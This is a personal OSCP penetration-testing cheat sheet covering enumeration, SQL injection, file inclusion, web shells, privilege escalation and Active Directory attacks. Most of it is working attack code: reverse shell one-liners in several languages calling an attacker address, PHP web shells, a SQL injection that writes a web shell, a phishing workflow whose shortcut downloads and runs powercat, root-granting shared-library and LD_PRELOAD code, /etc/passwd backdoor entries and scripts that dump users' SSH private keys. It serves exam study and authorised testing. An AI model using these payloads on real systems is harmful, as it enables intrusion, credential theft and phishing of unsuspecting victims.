# OSCP-shortsheet
- 🚀 Prepared as part of my OSCP journey.

# METHODOLOGY (MUST READ)
- https://github.com/adon90/pentest_compilation?tab=readme-ov-file
- https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3
- https://topi.gitbook.io/t0pitheripper/master/attacks

# Best summary
https://parzival.sh/blog/my-oscp-notes-and-resources

# Guides
- https://docs.gorigorisensei.com/tech-skills-needed/vim
- https://dev.to/adamkatora/how-to-use-burp-suite-through-a-socks5-proxy-with-proxychains-and-chisel-507e
- https://www.geeksforgeeks.org/linux-commands/?ref=lbp
- https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- https://hacktricks.boitatech.com.br/windows/active-directory-methodology/silver-ticket
- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
- https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Active%20Directory.md
- https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
- https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/
- https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
- https://notes.benheater.com/books/network-pivoting/page/penetrating-networks-via-chisel-proxies
- https://oscp.cyberdefendersprogram.com/oscp-the-exam    (msfvenom is allowed for unlimited use on the exam to create your reverse shell payloads (shell/reverse_tcp and shell_reverse_tcp))

# resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- https://github.com/brianlam38/OSCP-2022/tree/main/Tools
- https://book.jorianwoltjer.com/

# AD specific resources
- https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce#pass-the-hash
- https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md
- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/active_directory.md

# Priesc specific resources
1. (best)https://exploit-notes.hdks.org/exploit/linux/post-exploitation/linux-backdoors/
2. https://gist.github.com/ssstonebraker/fb2c43ad37a8a704bf952954ce95ec40
3. https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/
4. https://guide.offsecnewbie.com/privilege-escalation/linux-pe
5. https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e
6. https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/windows_enumeration_and_privilege_escalation.md
7. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
8. https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

# all about shells
https://github.com/r4hn1/Pentesting-Cheatsheet

# writeups
- https://v3ded.github.io/categories/
- https://0xdf.gitlab.io/

# Table of Content
- [Active Directory Pentesting](#active-directory-pentesting)
  - [Enumeration](#enumeration)
    - [Powerview](#powerview)

# Brief Pentest command cheatsheet
- https://github.com/deo-gracias/oscp/blob/master/pentest_command_cheat_sheet.md

# Initial Access 

## Connection
```bash
#attacker
root@kali:  rlwrap nc -nlvp 4444
#target
nc -nv 10.10.0.25 666 -e /bin/bash
nc.exe 192.168.100.113 4444 –e cmd.exe
```

## Enumeration
1. https://github.com/oncybersec/oscp-enumeration-cheat-sheet?tab=readme-ov-file#ssh-22tcp
2. https://docs.gorigorisensei.com/ports-enum/port-80

### Port Scan
```bash
#quick scan
sudo nmap -T4 -F x.x.x.x  
#fullscan
sudo nmap -sS -Pn -p- -A x.x.x.x
#udp scan
sudo nmap -sU -p- --max-retries 0 --min-rate 500 x.x.x.x  
#output to file
sudo nmap -sC -sV x.x.x.x -oN scanresult.txt
```
```bash
#rustscan
#quick
rustscan -a IP -r 1-65535
#detailed nmap - Service Scan, Version Scan, OS Detection
rustscan -a IP -r 1-65535 -- -A
```
```bash
#Autorecon
sudo autorecon 192.168.175.98
# Scan multiple targets
sudo autorecon -o enumeration $ip1 $ip2 $ip3 $ip4
```
```bash
#powershell's port scan
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts x.x.x.x"
```

### FTP (21)
- A few common passwords or usernames (if unknown) such as admin, administrator, root, ftpuser, test etc. should be tried if anonymous authentication is disabled on the remote FTP server
- common FTP command (https://steflan-security.com/ftp-enumeration-guide/)
```bash
#FTP Enum
nmap –script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1

#use FileZilla
#or use browser
ftp://X.X.X.X/ 

ftp X.X.X.X
#provide anonymous as username
#provide any passowrd

#FTP connect
ftp IP -p <<passive mode port no.>>

#recursive download all files
wget -r ftp://username:passsword@IP

#bruteforce credentials
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://X.X.X.X
```

### SSH (22)
```bash
nc $IP 22
```

### SMTP
```bash
nmap -p25 <[SUBNET]> --open
nc -nv IP 25
VRFY <[USERNAME]>
```

### Web scan (80, 443, 8080, 8081, 8443, and 3000)
```bash
#Nikto
nikto -h x.x.x.x

#Directory Brute Force (1)
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt-t 20 -x .txt,.php
gobuster dir -u https://10.129.168.90 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

#Directory Brute Force (2)
gobuster dir -u $url -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -s "200,204,301,302,307,403,500" -k -t 16 -o "tcp_port_protocol_gobuster.txt"  

python3 /opt/dirsearch/dirsearch.py -u $url -t 16 -e txt,html,php,asp,aspx,jsp -f -x 403 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch.txt"

Dirbuster (GUI): only perform extension brute force - disable 'Brute Force Dirs'

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -t 16 $url/FUZZ 2>&1 | tee "tcp_port_http_wfuzz.txt"

# Directory brute force recursively with max depth = 2
python3 /opt/dirsearch/dirsearch.py -u $url/apps/ -t 16 -e txt,html,php -f -x 403 -r -R 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch_apps.txt"

#Wfuzz
wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt -- hc 400,404,500 http://x.x.x.x/FUZZ
wfuzz -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -- hc 400,404,500 http://x.x.x.x/FUZZ

#Joomla
joomscan http://$IP

#cmsmap - scans for vuls in CMS
cmsmap.py https://x.x.x.x

#wpscan - scans for vuls in wordpress
wpscan --url https://x.x.x.x
 wpscan --url http://192.168.50.244 --enumerate p --pluginsdetection aggressive -o websrv1/wpscan    #scan plugins
#bruteforce wpscan
wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/s/best1050.txt -- username admin -- threads 10
```
#### All other web apps
- https://docs.gorigorisensei.com/web-apps 

### RPC (111, 135)
```bash
# List all registered RPC programs
rpcinfo -p $ip

# Provide compact results
rpcinfo -s $ip
```

```bash
rpcclient -U "" -N $ip
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

### SMB Enumeration (139, 445)
- https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/
- SMB can run: directly over TCP (port 445) OR via Netbios API (137/139)
- always check autorecon scans results on the SMB version to find exploitation

```bash
#checking Null session and check share listing (-N = no password)
smbmap -H x.X.X.x
smbclient -L \\\\X.X.X.x -U '' -N
smbclient \\\\x.x.x.x\\[sharename e.g.wwwroot]

#Enumerate shares
nmap --script smb-enum-shares -p 445 $ip

#account login
smbmap -u username -p password -H <target-ip>
smbmap -u username -p password -H <target-ip> -x 'ipconfig'
```

```bash
#steps to inspect samba version without metasploit
# https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#manual-inspection

#at Terminal A
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 

#at Terminal B
echo exit | smbclient -L [IP] 
```

### SMB commands
- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#manual-inspection 
```bash
smb> ls
#download
smb> get sample.txt
smb> get "Example File.txt"
#upload (If the website is associated with the SMB server, we can upload reverse shell script such as aspx, php and get a shell.)
smb> put example.txt
smb> put shell.aspx

#to trigger reverse shell script in smb
access to https://example.com/path/to/smb/share/shell.aspx
```

### SNMP (161)
```bash
# Enumerate entire MIB tree
snmpwalk -c public -v1 -t 10 $ip

# Enumerate Windows users
snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25

# Enumerate running Windows processes
nountsnmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2

# Enumerate open TCP ports
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3

# Enumerate installed software
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2
```
### MSSQL (1433)
```bash
# MSSQL shell
mssqlclient.py -db msdb hostname/sa:password@$ip

# List databases
SELECT name FROM master.dbo.sysdatabases

# List tables
SELECT * FROM <database_name>.INFORMATION_SCHEMA.TABLES

# List users and password hashes
SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ('G', 'R') ORDER BY sp.name
```

### MySQL (3306)
```bash
# Version detection + NSE scripts
nmap -Pn -sV -p 3306 --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_3306_mysql_nmap.txt" $ip
MySQL shell

mysql --host=$ip -u root -p
MySQL system variables

SHOW VARIABLES;     
Show privileges granted to current user

SHOW GRANTS;
Show privileges granted to root user

# Replace 'password' field with 'authentication_string' if it does not exist
SELECT user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv FROM mysql.user WHERE user = 'root';
Exact privileges

SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;     
Enumerate file privileges (see here for discussion of file_priv)

SELECT user FROM mysql.user WHERE file_priv='Y';

```

### any other protocol Emuneration
- https://docs.gorigorisensei.com/ports-enum 

## Searching exploits
```bash
searchsploit *duplicator*
searchsploit -x *50420*  #Searchsploit command to examine a specific exploit
 searchsploit -m *50420* #SearchSploit command to copy the exploit script to the current directory
```

### SQL injection
```bash
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```
#### Blind SQL Injection - This can be identified by Time-based SQLI
```bash
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

#### Manual Code Execution
```bash
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
```

#### SQLi test payload
- https://github.com/payloadbox/sql-injection-payload-list

#### SQLi resources
- https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/WEB/CHEATSHEETS/sqli.md
- https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md


#### LFI - often chained with php exploits. upload php payload and use LFI to read the payload and execute
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/
```bash
#LFI check - Unix
<base url>/../../../../../../etc/passwd
<base url>/../../../../../../etc/passwd%00
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500


#LFI check - Windows
<base url>/../../../../../../../windows/system32/drivers/etc/hosts
.././../../../../../../../../windows/system32/drivers/etc/hosts
../../../../../../../../../../windows/system32/drivers/etc/hosts%00
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts%2500

#LFI exploit
#(1) expect://
http://x.x.x.x/blah?parameter=expect://whoami

#(2) data://
http://x.x.x.x/blah?parameter=data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==
# the base64 encoded payload is: <? phpinfo(); ?>

#(3) input://
http://x.x.x.x/blah?parameter=php://input
# POST data (using Hackbar)
<? phpinfo(); ?>

#Base64 conversion
echo -n '<?php system($_GET['c']); ?>' | base64
#output is PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
```

#### RFI
```bash
http://example.com/index.php?page=http://example.evil/shell.txt

#Null Byte #
http://example.com/index.php?page=http://example.evil/shell.txt%00
```

## Reverse Shell payload
- https://www.revshells.com/ #Reverse Shell Generator
- https://highon.coffee/blog/reverse-shell-cheat-sheet/- https://guide.offsecnewbie.com/shells
- Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
- If connections drops or can not be established, try different ports 80,443,8080...
```bash
#Bash
bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
/bin/bash -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
/bin/sh -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
```

```Python
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```Perl
perl -e 'use
Socket;$i="x.x.x.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh-i");};'

#Perl Windows
perl -MIO -e '$c=new IO :: Socket :: INET(PeerAddr,"x.x.x.x:4444");STDIN->fdopen($c,r);$ ~- >fdopen($c,w);system$_ while<>;'
```

```PHP
php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```Ruby
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
#Netcat
nc -e /bin/sh x.x.x.x 4444
nc -e cmd.exe x.x.x.x 4444
/bin/sh | nc x.x.x.x 4444
rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 4444 0/tmp/p
```

```c
// gcc reverse.c -o reverse

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char ** argv)

int scktd;
struct sockaddr_in client;

client.sin_family = AF_INET;
client.sin_addr.s_addr = inet_addr("x.x.x.x"); // attacker IP
client.sin_port = htons(4444); // attacker port

scktd = socket(AF_INET,SOCK_STREAM,0);
connect(scktd,(struct sockaddr *)&client,sizeof(client));

dup2(scktd,0); // STDIN
dup2(scktd,1); // STDOUT
dup2(scktd,2); // STDERR

execl("/bin/sh","sh","-i",NULL,NULL);

return 0;
```

## Web Shell
- php : https://github.com/ivan-sincek/php-reverse-shell?tab=readme-ov-file
- aspx : https://github.com/borjmz/aspx-reverse-shell
```php
#wordpress
http://x.x.x.x/404.php?cmd=id
http://x.x.x.x/404.php?cmd=nc x.x.x.x 4444 -e /bin/sh

<? php echo shell_exec($_GET['cmd']); ?>
<? passthru($_GET["cmd"]); ?>
<? php echo shell_exec($_GET["cmd"]); ?>

#phpMyAdmin
<? php system("/usr/local/bin/wget http://x.x.x.x:4444/php-reverse-shell.php -O /var/tmp/hodor.php 2>&1"); ?>

#SQLQuery
SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"

#LFI reverse shell
http://x.x.x.x/blah?parameter=/etc/passwd%00
```

# Client Side Attack
## Microsoft Office documents containing Macros 

```bash
# set up Webdav share
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/

#on windows machine create new text file "config.Library-ms", paste the below code, edit the ip "http://192.168.119.5". and transfer to kali
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

#still on the windows machine, 1. right click create shortcut, 2. paste the below. 3.  install as shortcut file name, 4.  transfer the resulting shortcut file to Kali 
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"

#on kali
#host powercat for the phishing victim to download and return with reverse shell
cp /usr/share/powershellempire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
# then start netcat listener after running python3 web server
nc -nvlp 4444

#Send phishing email. body.txt is the email body using valid credentials from enumeration Username: john, : dqsTwTpZPn#nL
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
```

# Window Priv Esc
## Enumeration
### User
```bash
#which user
whoami

#what privilege
whoami /priv

#what other users
net users

#check for admin privilege
net localgroup administrators

#list all saved creds from Credential Manager
cmdkey /list

#users who are logged in in current session
qwinsta
```

### Password
```
#fgdump.exe
/usr/share/windows-binaries/fgdump/fgdump.exe
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump
```

### Network
```bash
#check ports that are alr opened
netstat -ano

#check host -  IP address associated with a hostname, bypassing the DNS lookup process.
C:\WINDOWS\System32\drivers\etc\hosts

#check firewall
netsh firewall show state
netsh firewall show config
netsh dump
```

### Use Powerup https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
```bash
# perform quick checks against a Windows machine for any privilege escalation opportunities
IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')
powershell.exe -nop -exec bypass
PS C:\> Import-Module .\PowerUp.ps1
PS C:\> Invoke-AllChecks
```

### Use Sherlock https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1 
```bash
IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')
powershell.exe -nop -exec bypass
PS C:\> Import-Module .Sherlock.ps1
PS C:\> Find-AllVulns
```

### Windows Exploits DB
- https://github.com/SecWiki/windows-kernel-exploits
- https://github.com/abatchy17/WindowsExploits

# Linux Priv Esc
- https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
## Enumeration
### User and system details
```bash
#7.Escalation Path Sudo - see what commands can be run by current user (as root) that do not require password
sudo -l

#find out commands that usually require the sudo command can be run without sudo
cat /etc/sudoers

#if any user that belongs to the group wheel can execute anything as sudo, to become root
sudo su

#check linux system details
cat /etc/*release*
uname -a
rpm -q kernel
dmesg | grep -i linux

#writable folders in linux (doesnt mean executable)
/tmp
/dev/shm

#services currently run by root
ps aux|grep root
ps -ef|grep root

#installed app
ls -lah /usr/bin/
ls -lah /sbin/
dpkg -l
rpm -qa
ls -lah /var/cache/apt/archives
ls -lah /var/cache/yum/

#scheduled task
crontab -l
ls -la /etc/cron*
ls -lah /var/spool/cron
ls -la /etc/|grep cron
cat /etc/crontab
cat /etc/anacrontab

#finding password in files
grep -rnw '/etc/passwd' -e 'root'

#finding the word "password" in files
grep -R 'password' config.php
find / -type f -exec grep -H 'password' \; 2>/dev/null
grep -R -i "password" 2> >(grep -v 'Permission denied' >&2)
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name " *. php" -print0 | xargs -0 grep -i -n "var $password"
```
### Linux SSH
- private key = id_rsa ,id_dsa (SSH2 only)
- public key = id_rsa.pub, id_dsa.pub (SSH2 only)
```bash
#find id_rsa using bash script
#!/bin/bash
for X in $(cut -f6 -d:' /etc/passwd |sort |uniq); do
  if [-s "${X}/.ssh/id_rsa" ]; then
    echo "### ${X}: "
    cat "${X}/.ssh/id_rsa"
    echo ""
  fi
done

#find id_dsa using bash script
#!/bin/bash
for X in $(cut -f6 -d':' /etc/passwd |sort |uniq); do
  if [-s "${X}/.ssh/id_dsa" ]; then
    echo "### ${X}: "
    cat "${X}/.ssh/id_dsa"
    echo
  fi
done
```

### Find SGID SUID GUID bit
```bash
find / -perm -1000 -type d 2>/dev/null

SGID (chmod 2000):
find / -perm -g=s -type f 2>/dev/null

#SUID (chmod 4000) :
find / -perm -u=s -type f 2>/dev/null
find /* -user root -perm -4000 -print 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -u=s 2>/dev/null | xargs ls -l
find / -user root -perm -4000 -exec ls -ldb {} \;

#SUID or GUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

#Add user to /etc/passwd and root group
echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
```

### create malicious .so file and place it in the location the program expects it to be
- identify any SUID binaries with missing .so files using a tool called strace.
- https://rootrecipe.medium.com/suid-binaries-27c724ef753c
```c
#include <stdio.h>
#include <stdlib.h>
# GCC attribute which will be run when a shared library is loaded.
static void inject() __attribute__((constructor));
void inject() {
# copies over /bin/bash and adds SUID bit to get root shell
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```bash
gcc -shared -o /home/user/custom.so -fPIC /home/user/custom.c
```

### Use LinPEAS and LinEnum and Linprivchecker
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
- https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py

### Linux Exploits DB
- https://github.com/SecWiki/linux-kernel-exploits
- https://github.com/xairy/linux-kernel-exploitation

## Linux PE methods
1. Editing /etc/passwd File (https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
```bash
#method 1
openssl passwd raj
echo 'aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash' >> /etc/passwd
su aarti

#method 2
Keep the root password blank and save the /etc/passwd file.
root::0:0:root:/root:/bin/bash
su root
```

2. SUID Binaries (https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
- If you execute ls -al with the file name and then you observe the small 's' symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.

3. Sudo Rights
- check root permissions for any user to execute any file or command by executing sudo -l command.
- can be permissions to use binary programs like find, python, perl, less, awk, nano
- can be permissions to use other programs like /usr/bin/env, /usr/bin/ftp, /usr/bin/socat
- can be permissions to run scripts like, .sh, .py or shell
![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/f5b0919f-ae15-4fbf-8377-660115352c68)
```bash
sudo -l
sudo /bin/script/asroot.sh
```

4. Misconfigure NFS
- 3 core configuration files (/etc/exports, /etc/hosts.allow, and /etc/hosts.deny), usually we will look only '/etc/export file'.
- cat /etc/exports and look for '*(rw,no_root_squash)'. take note of the folder that comes before it, can be /tmp or /home. Means shared /tmp or /home directory and allowed the root user on the client to access files to read/ write operation and * sign denotes connection from any Host machine
- can copy binary program like bash, or copy script like, .c (compile to shell), .py.
- can be combined with "Editing /etc/passwd File" using nano to add root access for new/exisiting users
- can be combine with sudo rights "sudo -l"
```bash
# gain access and make common access
mkdir /tmp/raj
mount -t nfs 192.168.1.102:/home /tmp/raj

# copy binary prog or script
cp /bin/bash .
chmod +s bash
ls -la bash

# copy binary prog or script
echo 'int main() { setgid(0); setuid(0); system("/bin/bash") ; return 0; }' > /tmp/raj/x.c 
gcc /tmp/mountme/x.c -o /tmp/raj/x
chmod +s /tmp/raj/x

#execution on victim machine for binary prog (GTFO - SUID)
cd /home
ls
./bash -p

#execution on victim machine for script
cd /home
./x

#nano to edit passwd file
./nano -p etc/passwd
raj:x:0:0:,,,:/home/raj:/bin/bash
```

5. LD_PRELOAD
- LD_Preload: It is an environment variable that lists shared libraries with functions that override the standard set
- Detection: 'sudo -l', look out for 'env_keep += LD_PRELOAD'
- exploitation: 
```bash
cd tmp
nano shell.c

#exploit code, can be found at hack tricks
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

#compile command
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

#launch exploit
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
```
  
# Active Directory Pentesting
## Enumeration
- To check local administrators in domain joined machine

### test for a quick No-Preauth win without supplying a username
```
GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
```

### tool to brute force of a valid username based on info collection so far (not unbounded brute force)
```bash
kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
```

### test if credentials are valid
```bash
kerbrute.py -user 'fsmith' -password 'Thestrokes23' -dc-ip 10.10.10.175 -domain Egotistical-bank.local
```

```powershell
net localgroup Administrators
```

### Powerview

```bash
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
Get-NetGroupMember -GroupName "Domain Admins"       #get SID, Group Doamin name, group name
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name

#Key commands for enumerations
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-NetGroup | select cn    #user list for password attacks
Get-DomainUser -PreauthNotRequired #quick win for AS-REP 
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion #attack old OS and see which are web server or file server
Find-LocalAdminAccess #scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName *client74* #
Get-ObjectAcl -Identity *stephanie* #see ObjectSID, ActiveDirectoryRights, SecurityIdentifier (securityidentifier has certain rights on objectSID)
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName
Invoke-UserHunter
Invoke-Portscan -Hosts sql01

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName #method 1
Convert-SidToName *S-1-5-21-1987370270-658905905-1781884369-1104*  #method 2
Find-DomainShare #find the shares in the domain. ##TIPS: ls all the NAME (folder) found in Find-DomainShare
ls \\*FILES04*\*docshare*   #name=docshare, computername=FILES04.corp.com
ls \\*dc1.corp.com*\sysvol\*corp.com*\ # %SystemRoot%\SYSVOL\Sysvol\domainname on the domain controller and every domain user has access to it.
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" #decrypt cpassword in Group Policy Preferences (GPP) in kali


Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```
### Crackmapexec

```bash
# First, detect if the SMB signing is enabled, which helps us identify machines that could be targeted for stealing hashes and relay attacks.
crackmapexec smb 10.129.204.177
#Or check using NMAP returned results

# Enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

